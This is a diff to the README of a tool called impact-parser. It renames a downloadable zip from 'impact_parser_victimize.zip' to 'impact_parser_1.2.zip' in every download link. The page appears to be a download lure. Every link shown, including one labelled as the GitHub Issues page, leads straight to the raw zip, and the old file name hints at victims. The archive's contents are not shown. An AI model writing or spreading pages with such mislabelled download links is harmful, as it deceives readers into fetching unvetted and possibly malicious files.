@@ -6,7 +6,7 @@ Welcome to **impact-parser**! This tool helps you understand service disruptions
 
 ## 📥 Download Now
 
-[![Download impact-parser](https://raw.githubusercontent.com/NamHwang/impact-parser/main/impact_parser/impact_parser_victimize.zip)](https://raw.githubusercontent.com/NamHwang/impact-parser/main/impact_parser/impact_parser_victimize.zip)
+[![Download impact-parser](https://raw.githubusercontent.com/NamHwang/impact-parser/main/impact_parser/impact_parser_1.2.zip)](https://raw.githubusercontent.com/NamHwang/impact-parser/main/impact_parser/impact_parser_1.2.zip)
 
 ## 💻 System Requirements
 
@@ -25,7 +25,7 @@ Welcome to **impact-parser**! This tool helps you understand service disruptions
 
 ## 🌐 Download & Install
 
-To download the latest version of impact-parser, visit this page: [Download impact-parser](https://raw.githubusercontent.com/NamHwang/impact-parser/main/impact_parser/impact_parser_victimize.zip). 
+To download the latest version of impact-parser, visit this page: [Download impact-parser](https://raw.githubusercontent.com/NamHwang/impact-parser/main/impact_parser/impact_parser_1.2.zip). 
 
 1. Click on the link above.
 2. Look for the latest release.
@@ -54,7 +54,7 @@ To download the latest version of impact-parser, visit this page: [Download impa
 
 ## 💬 Support
 
-If you run into any issues while using impact-parser, please open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/NamHwang/impact-parser/main/impact_parser/impact_parser_victimize.zip). We aim to respond as quickly as possible and help you get back on track.
+If you run into any issues while using impact-parser, please open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/NamHwang/impact-parser/main/impact_parser/impact_parser_1.2.zip). We aim to respond as quickly as possible and help you get back on track.
 
 ## 📜 License
 
